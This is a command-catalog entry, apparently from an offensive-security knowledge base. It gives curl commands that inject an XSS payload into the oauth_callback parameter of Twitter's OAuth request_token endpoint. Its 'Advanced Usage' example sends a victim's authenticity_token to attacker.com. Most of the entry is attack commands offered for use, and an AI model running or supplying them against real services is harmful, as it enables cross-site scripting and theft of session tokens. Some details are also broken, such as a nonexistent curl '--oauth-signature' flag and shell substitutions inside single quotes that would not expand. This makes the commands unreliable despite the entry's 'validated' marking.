---
id: cmd-curl-oauth-request-xss
data: >-
  curl -X POST 'https://api.twitter.com/oauth/request_token' -d
  'oauth_consumer_key=YOUR_CONSUMER_KEY' -d 'oauth_signature_method=HMAC-SHA1'
  -d 'oauth_timestamp=$(date +%s)' -d 'oauth_nonce=$(openssl rand -hex 32)' -d
  'oauth_version=1.0' -d
  'oauth_callback=javascript%3A%2F%2F%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'
  --oauth-signature 'BASE64_ENCODED_HMAC_SHA1_SIGNATURE'
tags:
  - oauth
  - xss
type: command
output: >-
  oauth_token=NPcud...&oauth_token_secret=abc123...&oauth_callback_confirmed=true
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:35.691Z'
verified: false
validated: true
submitted: true
---
# curl-request-token-xss

## Command

```bash
curl -X POST 'https://api.twitter.com/oauth/request_token' \
  -d 'oauth_consumer_key=YOUR_CONSUMER_KEY' \
  -d 'oauth_signature_method=HMAC-SHA1' \
  -d 'oauth_timestamp=$(date +%s)' \
  -d 'oauth_nonce=$(openssl rand -hex 32)' \
  -d 'oauth_version=1.0' \
  -d 'oauth_callback=javascript%3A%2F%2F%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E' \
  --oauth-signature 'BASE64_ENCODED_HMAC_SHA1_SIGNATURE'
```

## Description

Requests an OAuth token from Twitter API with a malicious XSS payload in oauth_callback, exploiting sanitization flaws for later JS injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d 'oauth_consumer_key=...'` | App consumer key | Yes |
| `-d 'oauth_callback=...'` | Malicious URL-encoded payload | Yes |
| `--oauth-signature '...'` | HMAC-SHA1 signature of request | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.twitter.com/oauth/request_token' -d 'oauth_callback=javascript%3Aalert(1)' [other params]
```

### Advanced Usage

```bash
curl -X POST 'https://api.twitter.com/oauth/request_token' -d 'oauth_callback=javascript%3A%2F%2F%22%3E%3Cscript%3Edocument.location=%27http://attacker.com?token=%27+document.querySelector(%22input[name=authenticity_token]%22).value%3C/script%3E' [other params]
```

## Expected Output

HTTP 200 with form-encoded response: oauth_token=TOKEN&oauth_token_secret=SECRET&oauth_callback_confirmed=true. Errors if signature invalid or callback rejected.

## Related

- [[Related Procedure: Obtain-Malicious-Request-Token-with-XSS-Callback]]
